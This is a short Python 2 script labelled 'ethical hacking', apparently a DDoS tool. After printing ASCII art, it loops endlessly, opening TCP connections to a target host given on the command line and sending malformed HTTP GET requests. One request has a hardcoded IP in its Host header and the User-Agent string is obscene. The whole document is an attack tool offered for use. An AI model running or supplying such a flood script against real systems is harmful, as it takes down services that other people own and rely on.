import socket, sys

print ""
print "                   -shddhhyo:                     "
print "                 `ydhysssssshh-                   "
print "                .dhhysssssssssd.                  "
print "                yhhhssssssssssys                  "
print "                mhhysssssssssssh                  "
print "                hhhyssssssssssys                  "
print "                /mhyssssssssssd-                  "
print "                 hhhsssssssssyy                   "
print "                 `hhysssssssyd.                   "
print "                  `ydhysssyhh.                  ``"
print "        `-:--..`.-:ooohdhhs+o. `:oo+-.      `./oss"
print "       .yyhhhhyyhhdh/:-sho..+hoyysoosso/-.:osssooo"
print "       hhhhhhhhhdmdmy/+shdhhdhhdhyhhyyssssyssoooss"
print "      -mmmdddhhhhdmddo---..-dhmddhhddmddhhyyysso:`"
print "      /mddhhhyhhhhmdhdo-   oysdddhsssssysyy:--.   "
print "      /mhhhhyhddhhhdmhd+` /hshdmdhooooy/ -o:      "
print "      :mhhhhsdmdddddmNdm//dydddNNhyoooy+          "
print "      +dhhhhomhhdmhhdhhysymyyydmNdhysoy+          "
print "      oddmNmhdhhyyyyyhhhhymhhdddmmdddsoh          "
print "      ydddhhhhhhhhhhhhhhhhhmdhhhhhmdysod`         "
print "      yhhhhhhhhhhhhhhhhhhhdmhhhhhhmhhooh/         "
print "      hhhhhhhhhhhhdddddddmNddddddddhhyoss         "
print "      /yddmmmmmmmmddhhhhhhmhhhhhddy+ooss:         "
print "          .dddmdmdddddhhhhmhhhyyhdh.              "
print ""
print "  | ETHICAL HACKING | SCRIPT POR DANIEL FREIRE | "
print ""
print "Press Ctrl-c to stop DDoS"
def ddos():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 80))
	s.send("GET / HTTP/0.9\r\n\r\n")
	s.send("Host: 187.73.33.90:8291\r\n\r\n")
	s.send("User-Agent: Meu Pau no seu cu 2.0.1 /NT Mac Safari 3.2.3\r\n\r\n")
	r = s.recv(1024)

true = 1
while true == 1:
	ddos()
